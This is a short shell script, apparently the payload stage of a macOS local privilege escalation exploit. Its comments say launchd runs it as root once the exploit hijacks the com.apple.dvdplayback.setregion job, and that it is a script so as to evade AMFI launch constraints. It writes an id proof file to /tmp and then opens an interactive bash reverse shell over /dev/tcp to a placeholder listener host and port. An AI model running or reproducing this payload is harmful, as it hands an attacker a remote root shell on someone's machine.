#!/bin/sh
# payload.sh -- executed as root by launchd after the exploit overwrites the
# com.apple.dvdplayback.setregion job's Program string with this path.
#
# Shebang execution (#!) is not subject to the AMFI launch constraints that
# would block running a tampered signed Mach-O -- this is why the payload is
# a shell script.
#
# 1. leave proof on disk
# 2. open a reverse shell to the listener started by run.sh

/usr/bin/id > /tmp/lpe-root-proof.txt 2>&1
/bin/bash -c 'exec /bin/bash -i >& /dev/tcp/__LHOST__/__LPORT__ 0>&1' &
